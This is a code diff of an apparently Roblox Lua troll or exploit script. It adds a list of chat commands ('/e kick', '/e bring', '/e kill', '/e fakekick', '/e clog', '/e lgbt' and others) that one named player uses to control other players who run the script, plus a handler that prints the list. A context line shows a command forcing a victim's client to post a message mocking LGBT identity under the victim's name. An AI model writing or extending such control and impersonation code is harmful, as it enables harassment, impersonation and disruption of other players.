@@ -50,6 +50,23 @@ notify1()
     end
 end
 
+local cmds = {
+    "/e kick",
+    "/e bring",
+    "/e kill",
+    "/e ct1",
+    "/e fakekick",
+    "/e ct2",
+    "/e kick1",
+    "/e blur",
+    "/e force-update",
+    "/e clog",
+    "/e getver",
+    "/e lgbt",
+    "/e cmds"
+    
+}
+
  function getChat()
      init1 = true
     game.Players.Hypickels.Chatted:Connect(function(msg)
@@ -94,6 +111,12 @@ end
              game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I am 100% LGBT-Q, and my pronouns are: She/Trans", "All")
          --  I am 100% LGBT-Q, and my pronouns are: She/Trans
          end
+         if msg == "/e cmds" then 
+            for i, v in pairs(cmds) do 
+                wait(1)
+                notify2(v)
+            end
+        end
     end)
 end
 function start()
